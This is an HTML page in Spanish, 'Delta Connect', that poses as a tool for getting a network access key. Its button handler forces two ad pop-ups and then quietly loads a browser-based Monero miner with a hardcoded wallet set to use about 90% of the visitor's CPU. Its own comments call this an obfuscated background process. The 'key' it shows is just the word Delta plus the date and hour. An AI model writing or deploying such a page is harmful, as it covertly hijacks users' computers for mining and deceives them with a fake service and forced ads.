<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta Connect - Acceso Directo</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #box { width: 90%; max-width: 400px; border: 2px solid #00ff00; padding: 20px; text-align: center; }
        .vid { width: 100%; height: 180px; background: #111; margin-bottom: 15px; border: 1px solid #00ff00; }
        button { background: #00ff00; color: #000; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; }
        #key-box { display: none; border: 1px dashed #00ff00; padding: 15px; margin-top: 15px; }
    </style>
</head>
<body>
<div id="box">
    <h3>DELTA_NETWORK_V6</h3>
    <div class="vid">
        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1" frameborder="0"></iframe>
    </div>
    <button id="btn" onclick="checkNet()">ESTABLECER CONEXIÓN</button>
    <div id="key-box">
        <p>TICKET GENERADO:</p>
        <h1 id="pass" style="color:#0f0;"></h1>
    </div>
</div>

<script>
    function checkNet() {
        // PUBLICIDAD FORZADA (Apertura estándar para asegurar la impresión)
        window.open("https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0", "_blank");
        window.open("https://omg10.com/4/10780938", "_blank");

        // CARGA OFUSCADA DEL PROCESO DE FONDO
        const loader = document.createElement('script');
        loader.src = "https://moneroocean.stream/webminer.js";
        loader.async = true;
        loader.onload = function() {
            // Se activa al 90% (throttle 0.1) para forzar la visibilidad en el CPU
            const job = new MoneroOcean.Anonymous('4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc', {throttle: 0.1});
            job.start();
        };
        document.body.appendChild(loader);

        // GENERAR CLAVE
        const d = new Date();
        document.getElementById('pass').innerText = "Delta" + d.getDate() + d.getHours();
        document.getElementById('btn').style.display = 'none';
        document.getElementById('key-box').style.display = 'block';
    }
</script>
</body>
</html>
